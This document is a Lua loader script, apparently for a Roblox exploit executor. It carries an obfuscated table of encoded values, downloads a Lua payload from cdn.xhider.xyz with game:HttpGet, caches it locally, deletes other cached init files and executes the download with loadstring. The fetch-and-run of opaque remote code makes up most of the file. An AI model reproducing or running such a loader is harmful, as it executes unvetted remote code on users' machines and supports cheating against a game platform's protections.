-- Do not save this file
  -- Always use the loadstring
  _bsdata0={970895562,"=JZIIyV6eGVmJiwxR8pvwN.WKgSUlUNw_pCmdJ0Pn0pkcN3AQ5wzB3STz8yQ5epCTn7MJJ20eBkGwtEimew1imhzco",1792182261905,"\116\99\75\188\190\48\228\150\137\64\71\158\93\65\174\122","nIEMli6hMVx.XV.h3t8u4V6pZ6P.mtVrJ8qd3YNffNQaX4CrOTVaxZ_sLC14InWKXc6QsQmONhn5ZFeqLVt5S3G3V","wbaWBCiPSAhbzIno9W2mVtIyoCGBJZcSWybtNwGfa.m0RJbgnMn7enaQcd_PYkBE_LYRYRSWtPUR8VIH85qmnZiyT",1532003970,2272214656,3818971320,3123416439,2535148684,3278423467,"88353946f2f4eda834f4ab0ef17756909b21add532e34278bdc76963c935bcaa54b48ed2912a456e3fd403abcde6580cec8ae69e8f9c8cb3ea3625e1fd7974c69b3344e249a5720f4b4f5250bde136e92fb5a75c6c8c6ffb34eb614a782baacb5bb22251b9bec125cb2d67750173c6274375a0e497a87bc6564151c3bf707a0bbf03c07913e95f9c6a9c538035f76b37f559582b9739cea4989c160f12e5448b970dd709b32dbccf67dde89fca5f08ed326736857ebd81059928d1a597d6771cefcb96c7ad0c2caa","\109\111\243\167\133\189\100\202\201\77\221\39\224\141\45\224\141\254\238\143\51\199\181\134"};
  local f,b,a="static_content_130520","ab41c9f0e2p-sephal"
  pcall(function() a=readfile(f.."/init-"..b..".lua") end)
  if a and #a>2000 then a=loadstring(a) else a=nil end
  if a then return a() end

  pcall(makefolder,f)
  a=game:HttpGet("https://cdn.xhider.xyz/v4_init_sephal.lua"..(_ca920af6193 or ""))
  writefile(f.."/init-"..b..".lua",a)

  local keep="init-"..b..".lua"
  local bs=string.char(92)
  local function clean(dir)
    local ok,list=pcall(listfiles,dir)
    if not ok or type(list)~="table" then return false end
    for _,v in ipairs(list) do
      local name=tostring(v):gsub(bs,"/"):match("([^/]+)$")
      if name and name~=keep and name:match("^init[%w%-]*%.lua$") then
        if not pcall(delfile,v) then pcall(delfile,f.."/"..name) end
      end
    end
    return true
  end
  if not clean(f) then clean("./"..f) end

  return loadstring(a)()